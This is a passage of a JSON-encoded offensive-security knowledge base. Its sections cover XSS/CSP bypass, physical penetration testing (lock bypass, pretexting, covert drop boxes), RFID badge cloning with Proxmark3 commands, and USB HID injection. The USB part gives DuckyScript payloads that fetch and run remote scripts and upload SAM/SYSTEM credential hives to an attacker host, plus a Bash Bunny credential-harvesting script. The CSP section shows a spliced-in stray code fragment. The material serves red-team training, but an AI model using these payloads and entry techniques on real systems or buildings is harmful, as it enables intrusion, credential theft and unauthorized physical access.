...'\n\n// BeEF hook (Browser Exploitation Framework)\n\n```\n\n#### CSP Bypass\n\n```javascript\n// If CSP allows 'unsafe-inline' → standard XSS works\n// If CSP uses nonce: need to steal nonce or find nonce reuse\n\n// Bypass via JSONP endpoint (allowed origin)\n// If *.cdn.target.com allowed and cdn has JSONP:\n\n\n// Bypass via Angular/Vue (if ng-app or v-html in allowed script source)\n// AngularJS sandbox escape: {{constructor.constructor('alert(1)')()}}\n\n// SVG XSS (often bypasses HTML sanitizers)\nNot Found\", status_code=404)\n```\n\nTLS certificate CN and SAN fields are logged by network monitoring tools — use wildcard certs from a CDN rather than Let's Encrypt certs tied to your actual domain.", "last_updated": "2026-03-18"}, "physical-security": {"slug": "physical-security", "title": "Physical Security & Lock Picking", "category": "Hardware & Physical", "content": "# Physical Security & Physical Penetration Testing\n\n## ◈ BEGINNER\n\n### What Is Physical Penetration Testing?\n\n**Physical penetration testing** assesses an organization's physical security controls — the locks, guards, cameras, badge readers, and visitor management procedures that prevent unauthorized access to buildings and sensitive areas. No matter how good your network security is, if an attacker can walk into the server room and plug in a device, it's game over.\n\n**Why it matters:** Most red team engagements focus on network and endpoint security. Physical access is frequently overlooked, yet a single successful entry can provide network access from inside the perimeter, bypass all firewall and EDR controls, and accomplish in minutes what might take weeks remotely.\n\n**Key terms:**\n- **Single pin picking (SPP)** — manipulating each pin in a lock individually using a tension wrench and hook pick; the most reliable lock picking technique\n- **Raking** — using a serrated pick to rapidly manipulate multiple pins at once; faster but less reliable than SPP\n- **Shim** — a thin piece of metal used to bypass a padlock by depressing the locking mechanism through the shackle hole\n- **Loiding** — using a flexible card (credit card, shim) to push back a spring latch; works on doors without a deadlatch\n- **Tailgating/piggybacking** — following an authorized person through a secured door; exploits human politeness\n- **Under-door tool** — a long flat blade inserted under a door gap that hooks the interior lever handle; opens lever-handle commercial doors in seconds\n- **REX sensor** — Request to Exit; a motion sensor that triggers door opening from inside; can sometimes be triggered externally through glass or door gaps\n- **Drop box** — a small network-connected device (Raspberry Pi, LAN Turtle) secretly planted on the target network; provides persistent remote access\n- **Get-out-of-jail letter** — a signed document from authorized leadership confirming the assessment; essential if security staff or law enforcement is encountered\n- **Security pins** — lock components (spool pins, serrated pins) that resist picking by creating false sets; indicate higher-security locks\n- **TOOOL (The Open Organisation Of Lockpickers)** — a well-known physical security research group; their tools and techniques are the standard reference\n\n**The physical assessment lifecycle:**\n```\n1. Authorization (written ROE + get-out-of-jail letter)\n2. External recon (Google Maps, Street View, LinkedIn employee photos)\n3. On-site observation (entry points, badge colors, guard patterns)\n4. Entry (tailgate, lock bypass, pretext, RFID clone)\n5. Objectives (server room, network device access, document photographing)\n6. Evidence capture (photos, video, device serial numbers)\n7. Cleanup (remove planted devices)\n8. Report (vulnerabilities, recommendations)\n```\n\n**Analogy:** Physical pen testing is like being a method actor for a burglary. You study the target, build the right persona, practice the right moves, and enter the scene with authorization — but everything you demonstrate is exactly what a real attacker would do.\n\n## ◈ INTERMEDIATE\n\nPhysical penetration testing assesses an organization's ability to detect and prevent unauthorized physical access. Many logical controls are rendered worthless if an attacker can walk into the server room.\n\n## Lock Picking Fundamentals\n\n### Pin Tumbler Locks\n\nThe most common lock type (Schlage, Kwikset, Master Lock):\n\n```\nLock anatomy:\n- Driver pins (top, spring-loaded)\n- Key pins (bottom, touch keyway)\n- Shear line: gap between plug and housing\n- When key inserted: lifts each pin stack to shear line simultaneously\n- Picking: manipulate each pin individually to shear line\n```\n\n### Single Pin Picking (SPP)\n\n```\nTools: tension wrench (bottom of keyway or top), hook pick\n\nTechnique:\n1. Apply light rotational tension with tension wrench\n2. Insert hook pick, find binding pin (feels stiffer than others)\n3. Lift binding pin until click/set (plug rotates slightly)\n4. Move to next binding pin, repeat\n5. When all pins set → plug rotates → lock opens\n\nKey insight: manufacturing tolerances create binding order\nLight tension = more pins bind simultaneously (harder to feel)\nHeavy tension = fewer pins bind (easier to feel, but easy to overset)\n```\n\n### Raking\n\nFaster but noisier than SPP:\n\n```\nTools: tension wrench + rake (city rake, snake rake, Bogota)\n\nTechnique:\n1. Apply medium tension\n2. Scrub rake in/out while varying height\n3. Random motion sets pins by chance\n4. Works well on cheap locks with loose tolerances\n\nSpeed: 5–30 seconds on low-security locks\n```\n\n### Bypass Techniques\n\n**Shimming padlocks**:\n```\n- Cut shim from aluminum can\n- Fold into U-shape\n- Insert into shackle hole alongside shackle\n- Depresses locking pawl → shackle releases\n- Defeats: most Master Lock, cheap padlocks\n- Fails on: double-locking padlocks (key-retaining)\n```\n\n**Loiding (credit card / shim)**:\n```\n- Insert flexible card between door frame and latch bolt\n- Push/shimmy while pushing door → latch retracts\n- Works on: spring latches without deadlatch plunger\n- Fails on: deadbolts, mortise locks, security strike plates\n```\n\n**Under-door tool**:\n```\n- Long flat blade inserted under door\n- Hook lifts lever-style door handle from inside\n- Works on: lever handles (very common in commercial buildings)\n- Time: 10–30 seconds\n- Nearly silent\n```\n\n**Bypass push-button electronic locks**:\n```\n- Many hotel/commercial push-button locks (Simplex, Alarm Lock)\n- Can be bypassed by pressing all buttons simultaneously (some models)\n- Or: \"attack mode\" — hold button combinations revealed in manuals\n```\n\n---\n\n## RFID Access Control Bypass\n\n(See rfid-nfc.md for detailed RFID cloning)\n\n```bash\n# Quick overview:\n# 1. Covert read with long-range reader (HID MaxiProx in bag)\n# 2. Clone to T5577 / magic card\n# 3. Present clone at reader\n\n# REX (Request to Exit) sensor bypass:\n# Motion sensor triggers door open from inside\n# Wave hand/use laser pointer near REX sensor on door frame\n# Works at ~50% of doors with improperly aimed REX sensors\n\n# Door gap attack:\n# Many electric strikes have 1-2cm gap at top corner of door frame\n# Thin rod + coathanger through gap reaches door release button\n```\n\n---\n\n## Tailgating & Social Engineering Entry\n\n**Tailgating** (piggybacking): follow authorized person through access-controlled door:\n- Timing: follow closely while person holds door (politeness exploited)\n- High-traffic times: morning rush, lunch, post-fire-drill\n- Delivery pretext: hands full with boxes → people hold doors\n\n**Pretext personas for physical access**:\n\n| Persona | Required Props | Best Entry Point |\n|---------|---------------|-----------------|\n| IT contractor | Laptop bag, lanyard, polo shirt | Server room access |\n| HVAC / maintenance | Coveralls, clipboard, toolbox | Mechanical rooms |\n| Delivery driver | Uniform, package, dolly | Loading dock, reception |\n| Fire marshal / auditor | Clipboard, hi-vis vest | Any area (authority) |\n| New employee | Lanyard (printed), confusion | Tailgate any door |\n| Vendor / salesperson | Business cards, laptop bag | Reception |\n\n---\n\n## Dumpster Diving\n\nDiscarded documents frequently contain:\n- Employee directories with names/phone numbers\n- Network diagrams\n- Old credentials, printed emails\n- Financial documents (compliance violation)\n- Decommissioned hardware (drives with data)\n\n```bash\n# Methodology:\n# 1. Identify trash collection schedule (avoid collection day — full bins)\n# 2. Time: evening after business hours, before collection\n# 3. Wear gloves, use sealed bags for transport\n# 4. Sort at secure location\n\n# Document shredder levels:\n# P-2 (strip cut): reassembleable — not secure\n# P-4 (cross cut 4×12mm): standard — reassembleable with effort\n# P-5 (micro cut): NSA-recommended minimum\n```\n\n---\n\n## Physical Penetration Test Methodology\n\n### Phase 1: Scoping\n\nDefine in written authorization:\n- Target locations (specific addresses)\n- Allowed entry methods (tailgating? lock picking? social engineering?)\n- Out-of-scope areas (data centers, executive floors)\n- Emergency abort procedures\n- Arrest contingency (get-out-of-jail letter format)\n\n### Phase 2: Reconnaissance\n\n```bash\n# External recon:\n# Google Street View: map entry/exit points, camera positions\n# Google Maps satellite: roof access, parking, loading docks\n# Social media: employee photos showing badge design, office interior\n# LinkedIn: employee names, roles, titles for pretext\n\n# On-site observation (before engagement):\n# Note: badge colors/types, uniform styles, visitor process\n# Observe: entry procedures, guard behavior, camera positions\n# Time: how long doors take to close, traffic patterns\n```\n\n### Phase 3: Entry\n\n**Social engineering entry flow**:\n1. Arrive at peak traffic time (9–10am)\n2. Approach with pretext prepared (delivery for \"John Smith in IT\")\n3. If challenged: have supporting props ready (fake work order, business card)\n4. If denied: note details, try different entry point or return later\n5. Never argue or escalate suspicion — \"No problem, I'll reschedule\"\n\n**Lock attack sequence**:\n1. Assess lock type (visual + photo)\n2. Lowest-resistance bypass first (loiding, REX sensor, gap attack)\n3. If bypass fails: picking (SPP or rake)\n4. Time limit: 2 minutes max before moving on or aborting\n\n### Phase 4: Objectives\n\nTypical physical pen test objectives:\n- Access server room / network closet\n- Install rogue device (Raspberry Pi, LAN Turtle, drop box)\n- Screenshot/photograph sensitive documents\n- Access executive workstation\n- Physical access to domain controller\n- Badge clone (photo badge, note access level)\n\n**Drop box placement**:\n```bash\n# LAN Turtle / Packet Squirrel (Hak5): plugs into network port\n# Raspberry Pi: full computer, WiFi C2 back to operator\n# Hide in: network closets, under desks, behind furniture\n# Ensure: power source, network connection, C2 connectivity\n\n# Vantablack agent: deploy on drop box for remote access\n# Transport: connect to existing network port in wiring closet\n```\n\n### Phase 5: Exfiltration and Cleanup\n\n- Photograph evidence of access (without exposing individuals)\n- Remove all planted devices\n- Document timestamps and locations\n- Do not remove actual data (unless explicitly authorized)\n\n---\n\n## Physical Security Controls Assessment\n\n| Control | Test Method | Common Weakness |\n|---------|-------------|-----------------|\n| Access control (card) | Badge clone | Proximity (no crypto) cards |\n| CCTV | Note coverage gaps | No monitoring, footage not reviewed |\n| Guards | Tailgate test, pretext | Politeness, distraction |\n| Locks | Pick test | Pin tumbler (5-pin), no security pins |\n| Alarms | Entry timing | Motion sensor delay, no IR beam |\n| Visitor management | Fake delivery | No escort policy |\n| Clean desk | Observation | Passwords on sticky notes |\n| Shredding | Dumpster dive | Strip-cut shredders, bins accessible |\n\n---\n\n## Tools Kit\n\n```\nLock picks: Sparrows Reload Kit (hook, rakes, tension)\nBypass tools: under-door tool, loid cards\nRFID: Proxmark3, Flipper Zero, HID MaxiProx (long-range)\nDrop box: Raspberry Pi Zero W + Vantablack agent\nDocumentation: encrypted SD card, pocket camera\nIdentity: pretext props, printed fake work order\nEmergency: get-out-of-jail letter (signed by client)\n```\n\n## ◈ ADVANCED\n\n### High-Security Lock Attacks\n\nStandard SPP is insufficient for security-grade locks with anti-pick pins:\n\n```\nSecurity pin types and attack adaptations:\n\nSpool pins (most common): create false set (plug rotates slightly but not fully)\n→ Feel: tension slightly drops when spool hits shear line\n→ Response: REDUCE tension when false set felt → spool drops through shear line → real set\n\nSerrated pins: multiple false sets per pin\n→ Feel: multiple clicks/sets before full open\n→ Response: methodical SPP with very light tension; each serration is a micro-set\n\nMushroom pins: combine spool + serration effects\n→ Most difficult: found in Medeco, Mul-T-Lock, ASSA Abloy\n→ Attack: requires bump key or destructive entry for time-limited engagements\n\nBump key technique:\n- Cut key to all-maximum depth (999 key)\n- Insert, pull out one step\n- Apply rotational tension + sharp impact (specialized bump hammer)\n- Impact bounces driver pins momentarily above shear line\n- Works on ~50% of pin tumbler locks\n- Modern high-security locks: anti-bump springs prevent this\n```\n\n### Electronic Access Control Bypass\n\nPhysical manipulation of electronic access systems without RFID cloning:\n\n```\nPower cycling attack:\n- Many electromechanical strikes return to \"fail open\" state on power loss\n- Brief power interrupt to door strike circuit → door opens\n- Attack: locate strike power cable (often in ceiling above door frame)\n- Use: wire exposed to temporarily short circuit (1-2 second interrupt)\n\nWiegand bus intercept:\n- Wiegand is the protocol between badge reader and access controller\n- Unencrypted 2-wire bus running through the reader (often exposed externally)\n- Intercept with Proxmark3 or hardware tap → record any valid badge credential\n- Replay tap → access granted without having the physical badge\n\nCrash bar attack:\n- Commercial crash bars (panic hardware) have emergency release from inside\n- Thin tool through door gap near crash bar → push release mechanism\n- Works on: most exterior doors with crash bars and no door alarm sensor at gap\n```\n\n### Drop Box Persistence and Concealment\n\n```bash\n# Raspberry Pi Zero W drop box — concealment and persistence\n\n# Power options (no visible wires):\n# - PoE injector: steals power from Ethernet cable (single cable, no power outlet needed)\n# - USB charging point in conference room\n# - POE switch port (most conference rooms have active PoE)\n\n# Concealment:\n# - ABS plastic enclosure painted to match junction boxes\n# - Magnetic mount for attachment behind metal filing cabinets\n# - Fake ethernet port cover housing the device\n\n# Network discovery evasion:\n# - Randomize MAC address daily\n# - Use OS fingerprint spoofing (p0f passive mode + scapy response shaping)\n# - Match beacon interval to legitimate device patterns\n\n# Redundant C2 channels:\n# - Primary: HTTPS beacon over corporate internet\n# - Fallback: WiFi hotspot (cellular data via USB modem)\n# - Emergency: DNS beacon (works even behind restrictive firewalls)\n```\n\n### Post-Entry Evidence Capture\n\nMaximize intelligence from physical presence without physically taking anything:\n\n```bash\n# Quick network capture (60 seconds at any active port):\n# Plug in Packet Squirrel → captures traffic passively → retrieve later\n# Or: laptop + Wireshark in promiscuous mode → ARP, DHCP, SMB reveals internal hosts\n\n# Credential capture at workstation (1-2 minutes):\n# Insert BadUSB → dumps LSASS to USB drive → retrieves hashes\n# Boot to live USB → captures SAM/SYSTEM from disk\n\n# Physical network device photography:\n# Photos of: switch model/firmware label, router config page (web UI open?)\n# Screenshots of: unlocked screens, open documents, network diagrams on whiteboard\n# Serial numbers: asset tags → OSINT for product manuals, default credentials\n\n# Document scanning (30 seconds):\n# CamScanner + high-megapixel phone → multi-page docs in seconds\n# Focus on: directories with names/numbers, network diagrams, printed credentials\n```", "last_updated": "2026-03-18"}, "rfid-nfc": {"slug": "rfid-nfc", "title": "RFID & NFC Attacks", "category": "Hardware & Physical", "content": "# RFID & NFC Attacks\n\n## ◈ BEGINNER\n\n### What Are RFID and NFC Attacks?\n\n**RFID** (Radio Frequency Identification) and **NFC** (Near Field Communication) are wireless technologies used in physical access control cards, hotel keys, transit passes, and contactless payment. Attacking these systems is a core physical red team capability — cloning an access badge lets you enter any door the original badge can open.\n\n**Why they're vulnerable:** Most RFID badges in corporate environments (HID Prox, EM4100) use 125kHz technology from the 1980s with zero cryptography. The card broadcasts its unique ID to any reader in range. Anyone with a compatible reader can capture that ID without the cardholder noticing. With a writable blank card, you can replay any captured ID to any reader.\n\n**Key terms:**\n- **125kHz LF (Low Frequency)** — the frequency band used by most corporate access cards (HID Prox, EM4100, Indala); no cryptography; trivially clonable\n- **13.56MHz HF (High Frequency)** — used by MIFARE Classic, iCLASS, DESFire, and NFC payment cards; some have cryptography (easily broken for MIFARE Classic)\n- **HID Prox** — the most common corporate access card in the US; 125kHz; no encryption; reads at 5-8cm with standard reader, 30-50cm with specialized antenna\n- **Proxmark3** — the professional standard tool for RFID research; reads, writes, emulates, and attacks both LF and HF cards; used by security researchers worldwide\n- **Flipper Zero** — a pocket-sized multi-tool that reads and emulates RFID/NFC cards, sub-GHz remotes, infrared, and performs BadUSB; popularized RFID attacks for non-experts\n- **T5577** — a writable 125kHz blank card that can be programmed to emulate HID Prox, EM4100, and other LF formats; the attacker's cloning medium\n- **Magic card (CUID)** — a writable MIFARE Classic card that allows overwriting the UID; used to clone HF access cards\n- **Facility code** — part of the HID Prox card encoding; shared across all cards at an organization; brute-forcing card numbers within a known facility code can enumerate valid badges\n- **MIFARE Classic** — a common HF card type with a broken cryptographic implementation (Crypto-1); all keys recoverable offline given a reader and ~minutes of time\n- **mfoc / autopwn** — tools that automatically recover MIFARE Classic encryption keys using the card's weak random number generator\n- **NFC relay** — using two devices (one near the card, one at the reader) to relay NFC authentication in real time, extending effective card range across any distance\n\n**The badge cloning attack:**\n```\n1. Read target's HID Prox badge (5-8cm range)\n2. Note facility code and card number\n3. Write cloned ID to T5577 blank card\n4. Present T5577 to badge reader → door opens\n```\n\n**Analogy:** RFID cloning is like photocopying someone's government ID. The original has a magnetic stripe (or in this case, an RF broadcast) that any reader accepts. Without cryptography, a perfect copy is indistinguishable from the original.\n\n## ◈ INTERMEDIATE\n\n## Frequency Bands and Card Types\n\n| Frequency | Band | Range | Common Cards | Attack Difficulty |\n|-----------|------|-------|--------------|-------------------|\n| 125 kHz | LF | 0–10 cm | HID Prox, EM4100, EM4200, Indala | Easy — no crypto |\n| 13.56 MHz | HF | 0–10 cm | MIFARE Classic, MIFARE DESFire, iCLASS, NTAG, FeliCa | Varies |\n| 860–960 MHz | UHF | 1–10 m | ISO 18000-6C (EPC Gen2), UHF badges | Medium |\n| 13.56 MHz | HF/NFC | 0–20 cm | ISO 14443A/B, ISO 15693, NFC Forum | Varies |\n\n---\n\n## Tools\n\n### Proxmark3\n\nThe Proxmark3 (PM3) is the gold standard for RFID security research — reads, clones, emulates, and fuzzes both LF and HF cards:\n\n```bash\n# Install PM3 client\ngit clone https://github.com/RfidResearchGroup/proxmark3\ncd proxmark3 && make clean && make all\nsudo make install\n\n# Flash firmware\npm3-flash-fullimage\n\n# Connect\npm3 # or: proxmark3 /dev/ttyACM0\n\n# ---- LF Commands (125kHz) ----\n# Auto-detect and read LF card\npm3 --> lf search\n\n# Read EM4100/EM4102 (most common LF cards)\npm3 --> lf em 410x read\n# Output: EM TAG ID: 1122334455\n\n# Clone EM4100 to T5577 writable card\npm3 --> lf em 410x clone --id 1122334455\n\n# Read HID Prox (very common in corporate offices)\npm3 --> lf hid read\n# Output: HID Prox ID: 2006ec0c86 (FAC=108, CN=1158)\n\n# Clone HID Prox to T5577\npm3 --> lf hid clone -r 2006ec0c86\n\n# Brute-force HID card numbers (facility code known)\npm3 --> lf hid brute -f 108 --delay 500\n\n# ---- HF Commands (13.56MHz) ----\n# Auto-detect HF card\npm3 --> hf search\n\n# MIFARE Classic — list tags\npm3 --> hf mf info\n\n# MIFARE Classic — crack keys (PRNG weakness)\npm3 --> hf mf autopwn\n# Tries default keys + nested attack → dumps full card\n\n# MIFARE Classic — read with known keys\npm3 --> hf mf dump\n\n# MIFARE Classic — clone to magic card (CUID/Gen2)\npm3 --> hf mf cload -f hf-mf-XXXXXXXX-dump.bin\n\n# iCLASS read\npm3 --> hf iclass read\npm3 --> hf iclass dump --ki 0 # with default key\n\n# NTAG215 (Amiibo-style) — read all pages\npm3 --> hf mfu info\npm3 --> hf mfu dump\n```\n\n### Flipper Zero\n\nThe Flipper Zero is a portable, pocket-sized multi-tool for RFID, NFC, sub-GHz, IR, and BadUSB:\n\n```\n# LF RFID (125kHz):\n# Main Menu → RFID → Read → place card → Save\n# Emulate: RFID → Saved → select → Emulate\n# Supported: HID26, EM4100, Indala, Paradox, etc.\n\n# NFC (13.56MHz):\n# Main Menu → NFC → Read → save as .nfc file\n# Emulate: NFC → Saved → Emulate\n# Supports: MIFARE Classic (partial, keys needed), NTAG, MiFare Ultralight\n\n# Sub-GHz (garage doors, remotes):\n# Sub-GHz → Read RAW → press button → save → Send\n\n# BadUSB (HID injection):\n# Copy .txt DuckyScript to SD card → BadUSB → select → Run\n```\n\nFlipper Zero MIFARE Classic with mfkey32 (offline key recovery):\n```bash\n# 1. On Flipper: NFC → Read → saves nonces to .nfc file\n# 2. Extract nonces from .nfc file\n# 3. Run mfkey32v2 to recover sector keys\n./mfkey32v2 <{nr}> <{ar}> <{nr2}> <{ar2}>\n# Then enter keys into Flipper to read all sectors\n```\n\n### ACR122U (NFC USB Reader)\n\n```bash\n# Install libnfc\nsudo apt install libnfc-dev libnfc-bin -y\n\n# Scan for NFC tags\nnfc-list\n\n# MIFARE Classic tools\nsudo apt install mfoc mfcuk -y\n\n# mfoc: recover MIFARE Classic keys using nested attack (requires ≥1 known key)\nmfoc -O dump.mfd\n\n# mfcuk: recover keys using hardnested attack (no known keys required, slower)\nmfcuk -C -R 0:A -s 250 -S 250\n\n# libnfc-based tools\nnfc-mfclassic r a dump.mfd # read with key A\nnfc-mfclassic W a source.mfd dump.mfd # write (clone)\n```\n\n---\n\n## Attack Scenarios\n\n### Office Badge Cloning\n\n**Target**: HID Prox (125kHz) — most common US corporate badge.\n\n```bash\n# Step 1: Read victim badge (covert — PM3 in bag, range 5-8cm)\n# Commercial readers: HID MaxiProx 5375 has 50cm range\npm3 --> lf hid read\n\n# Step 2: Note the ID\n# HID Prox ID: 2006ec0c86 (Facility Code: 108, Card Number: 1158)\n\n# Step 3: Write to T5577 blank card\npm3 --> lf hid clone -r 2006ec0c86\n\n# Step 4: Present cloned card to reader\n# T5577 emulates the original — reader cannot distinguish\n```\n\n**Covert reading**: Build a long-range reader using an Arduino + RFID module in a backpack. Stand near target in elevator or badge-in queue. Range: 30–50cm with antenna optimization.\n\n### Hotel Key Duplication (MIFARE Classic)\n\nMost hotel keys use MIFARE Classic 1K with weak or default keys:\n\n```bash\n# Autopwn: tries default keys, then nested attack\npm3 --> hf mf autopwn\n# Dumps all 16 sectors if successful\n\n# Load dump onto blank MIFARE Classic (magic card)\npm3 --> hf mf cload -f dump.bin\n\n# Result: functionally identical key for room access\n```\n\n### NFC Relay Attack\n\nRelay attacks extend the range of contactless cards using two phones/devices — one near the card, one at the reader:\n\n```bash\n# Tools: NFCGate (Android), Proxmark3 with PM3-Relay plugin\n# Phone A: near victim's card/wallet (covert)\n# Phone B: at reader\n# Both connected via TCP — relay NFC commands in real-time\n\n# PM3 approach:\npm3 --> hf relay # puts PM3 into relay mode\n# Useful for NFC payment relay (attack range: ~1km via internet)\n```\n\n---\n\n## MIFARE DESFire (More Secure)\n\nDESFire EV1/EV2/EV3 uses 3DES or AES — not broken by PRNG attacks:\n\n```bash\npm3 --> hf mfdes info # card info\npm3 --> hf mfdes auth --aid 000000 --algo AES --key 00000000000000000000000000000000\n# Brute force: only viable with very weak/default keys\n# EV2/EV3: transaction MAC, proximity check — relay much harder\n```\n\nDESFire is significantly harder to attack — focus social engineering or physical access if encountered.\n\n---\n\n## Detection and Evasion\n\n- Most access control systems log badge reads — cloned badge leaves same digital footprint as original\n- Some systems detect \"badge at two locations simultaneously\" — avoid using clone while original is also active\n- Modern readers (OSDP protocol): encrypted comms between reader and controller — skimming reader traffic requires cryptanalysis\n- Best evasion: look like a normal employee presenting badge normally\n\n---\n\n## Legal Note\n\nRFID/NFC cloning requires explicit written authorization. Even \"reading\" a badge without permission may violate computer fraud laws. Always operate within defined scope of engagement.\n\n## ◈ ADVANCED\n\n### Long-Range Badge Harvesting\n\nStandard Proxmark3 range is 5-8cm — requires close physical proximity. Long-range techniques:\n\n```\nHID MaxiProx 5375 reader:\n- Commercial long-range HID reader\n- Reads HID Prox up to 50cm (1.6 feet)\n- Wiring: Wiegand output → Proxmark3 or custom data logger\n- Concealment: fits in laptop bag, briefcase, or custom housing\n\nDIY long-range reader:\n- Arduino Mega + 125kHz RFID reader (RDM6300/MFRC522-LF)\n- Optimized antenna: larger coil = longer range (up to 30cm)\n- Data: stored to SD card or sent via WiFi/Bluetooth\n\nAttack scenarios:\n- Elevator: stand behind target → 20-30cm is achievable naturally\n- Building entrance queue: people bunch up → badge reads at 15-20cm\n- Cafeteria checkout: natural position at payment terminal height\n- Planted reader: concealed at door frame or under reception desk\n\nCounter: check badge with smartphone NFC app (varies by phone model)\n```\n\n### iCLASS Key Extraction\n\niCLASS is more secure than HID Prox but has known vulnerabilities:\n\n```bash\n# iCLASS Standard uses 64-bit DES encryption with derived keys\n# Master key extraction: published by researchers in 2012 (HID's key extraction)\n# With master key: any iCLASS card is readable\n\n# Proxmark3 iCLASS attack:\npm3 --> hf iclass loclass # offline attack using captured data\npm3 --> hf iclass dump --ki 0 # dump with known/default key\npm3 --> hf iclass sim -t 3 # simulate iCLASS tag\n\n# iCLASS Elite: uses per-site derived keys (harder — no master key attack)\n# Attack path: physical keypad reader → capture Wiegand output directly\n# Wiegand tap: intercept 2-wire Wiegand bus between reader and controller\n```\n\n### OSDP Protocol Analysis\n\nModern installations use OSDP (Open Supervised Device Protocol) — encrypted Wiegand replacement:\n\n```\nOSDP features:\n- AES-128 encrypted communication between reader and controller\n- Bidirectional (controller can query reader status)\n- Secure channel establishment (prevents passive capture)\n\nOSDP attack surface:\n- Version 1 (OSDPv1): no encryption → Wiegand data in plaintext over RS-485\n- Version 2 (OSDPv2): AES-128 SCB (Secure Channel Block)\n → if encryption not configured (many installs): falls back to plaintext\n → if default keys used: key extraction possible\n\nTool: Proxmark3 with OSDP module\npm3 --> hf osdp read -d /dev/ttyUSB0 # monitor RS-485 bus passively\n```\n\n### Building Multi-Factor Access Bypass\n\nWhen badge + PIN is required:\n\n```\nApproach 1: Shoulder surfing\n- Observe PIN entry from distance → combine with badge clone\n- Modern option: telephoto lens + tripod at safe distance\n- PIN entry patterns: predictable (1234, 9876, date of birth)\n\nApproach 2: PIN pad bypass\n- Some Simplex/Trilogy mechanical PIN pads have no lockout\n- Try combinations: 1-2-3-4, 0-0-0-0, 1-3-5 (popular patterns)\n- Physical attack: PIN pads often have accessible screw terminals\n → Power cycle the controller → may default to fail-open\n\nApproach 3: Social engineering\n- Vishing: \"IT security audit — I need to verify your room code for the audit log\"\n- Observation: people habitually enter PIN without checking their surroundings\n```", "last_updated": "2026-03-18"}, "usb-attacks": {"slug": "usb-attacks", "title": "USB Attacks & HID Injection", "category": "Hardware & Physical", "content": "# USB Attacks & HID Injection\n\n## ◈ BEGINNER\n\n### What Are USB Attacks?\n\n**USB attacks** exploit the inherent trust that operating systems place in USB devices. When you plug in a USB device, Windows immediately recognizes it and installs drivers — before any user interaction. Attackers exploit this by creating USB devices that masquerade as trusted peripherals (keyboards, network adapters) and automatically execute payloads the moment they're plugged in.\n\n**Why they're so effective:** USB HID (Human Interface Device) attacks work because keyboards are always trusted. When an OS sees a USB keyboard, it accepts keystrokes from it. A malicious device that appears as a keyboard can type a full attack payload — silently, at 1000 characters per second — in the time it takes to blink.\n\n**Key terms:**\n- **HID (Human Interface Device)** — a USB device class for human-input devices (keyboard, mouse); OS-trusted; no special drivers needed; the attack surface for most USB keyboard injection\n- **HID injection** — a USB device pretending to be a keyboard that automatically types malicious commands when plugged in\n- **DuckyScript** — the payload language for Rubber Ducky and similar tools; supports keystrokes, delays, conditionals, and multi-OS targeting\n- **Rubber Ducky** — the original USB HID injection device by Hak5; looks like a USB flash drive but emulates a keyboard; executes DuckyScript payloads\n- **Bash Bunny** — a more capable Hak5 device that can switch between HID, network adapter, and USB storage modes; runs Linux natively\n- **OMG Cable** — a charging cable with an embedded WiFi-connected microcontroller; looks identical to a real cable; delivers HID payloads remotely\n- **BadUSB** — a generic term for any USB device reprogrammed to perform malicious functions; originally referred to firmware-level attacks on USB controllers\n- **Digispark / Arduino Leonardo** — cheap microcontroller boards (under $5) that can be programmed as HID keyboard emulators; DIY Rubber Ducky\n- **RNDIS (Remote NDIS)** — a USB protocol that makes a device appear as a network adapter; used to add a rogue network interface to a target and intercept traffic\n- **Drop attack** — planting malicious USB devices in areas likely to be picked up by employees; studies show ~50% of dropped drives are inserted\n- **P4wnP1** — a Raspberry Pi Zero W based platform that combines HID injection, WiFi AP, and USB network adapter in a single device\n\n**Why USB attacks bypass security controls:**\n- HID devices are whitelisted by default in Group Policy — keyboards must work\n- No AV scanning of keyboard input\n- Execution happens before EDR hooks are established (very fast)\n- Physical delivery bypasses all network-based security\n\n**Analogy:** A USB HID attack is like hiring someone to sit at your target's computer and type really fast while they're not looking. The OS has no way to tell the difference between a real keyboard and a fake one — both are just \"trusted keyboards.\"\n\n## ◈ INTERMEDIATE\n\n## USB Attack Categories\n\n| Category | Method | Detection Risk |\n|----------|--------|----------------|\n| HID Injection | Emulate keyboard, type payload | Low (looks like typing) |\n| Network Adapter | Add rogue NIC, change default route | Medium |\n| Mass Storage + Autorun | LNK/autorun exploit | High (blocked on modern OS) |\n| Charging Cable MITM | OMG Cable, O.MG implant | Very low |\n| Firmware Attack | Juice jacking, USB killer | Destructive |\n\n---\n\n## Rubber Ducky / Hak5\n\nThe USB Rubber Ducky emulates a keyboard and types DuckyScript payloads at superhuman speed:\n\n### DuckyScript Syntax\n\n```ducky\nREM Basic reverse shell dropper (Windows)\nDELAY 1000\nGUI r\nDELAY 300\nSTRING powershell -w hidden -nop -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.50/p.ps1')\"\nENTER\n\nREM Exfil credentials\nDELAY 500\nGUI r\nDELAY 200\nSTRING cmd /c \"reg save HKLM\\SAM C:\\Windows\\Temp\\s & reg save HKLM\\SYSTEM C:\\Windows\\Temp\\sy\" & start /min powershell -c \"Invoke-WebRequest -Uri http://192.168.1.50/up -Method POST -InFile C:\\Windows\\Temp\\s\"\nENTER\n```\n\n```ducky\nREM macOS payload\nDELAY 1000\nCOMMAND SPACE\nDELAY 500\nSTRING terminal\nENTER\nDELAY 800\nSTRING curl -s http://192.168.1.50/mac.sh | bash\nENTER\n```\n\n### Key DuckyScript Commands\n| Command | Action |\n|---------|--------|\n| `DELAY N` | Wait N milliseconds |\n| `STRING text` | Type text |\n| `ENTER` | Press Enter |\n| `GUI r` | Win+R (Run dialog) |\n| `CTRL ALT DELETE` | Ctrl+Alt+Del |\n| `ALT F4` | Alt+F4 |\n| `CAPSLOCK` | Toggle caps lock |\n| `REPEAT N` | Repeat last line N times |\n\n---\n\n## Bash Bunny (Hak5)\n\nThe Bash Bunny supports multiple attack modes and can switch between HID, Ethernet, and serial:\n\n```bash\n# Payload directory: /root/payloads/switch1/payload.txt\n\n#!/bin/bash\n# Credential harvesting payload\n\nATTACKMODE HID STORAGE # appear as keyboard + USB drive\n\nLED ATTACK\n\n# Wait for OS to recognize device\nsleep 3\n\n# Windows: dump credentials to Bash Bunny storage\nRUN WIN \"powershell -ep bypass -w hidden \\\"Get-Credential | Export-Clixml F:\\creds.xml\\\"\"\nsleep 5\n\n# Or: run from storage\nRUN WIN \"powershell -ep bypass F:\\payload.ps1\"\n\nLED FINISH\n```\n\n---\n\n## P4wnP1 A.L.O.A. (Raspberry Pi Zero W)\n\nP4wnP1 turns a Raspberry Pi Zero W into an advanced USB attack platform with WiFi C2:\n\n```bash\n# Install on Raspberry Pi Zero W\n# GitHub: mame82/P4wnP1_aloa\n\n# Features:\n# - HID script engine (similar to DuckyScript)\n# - USB gadget 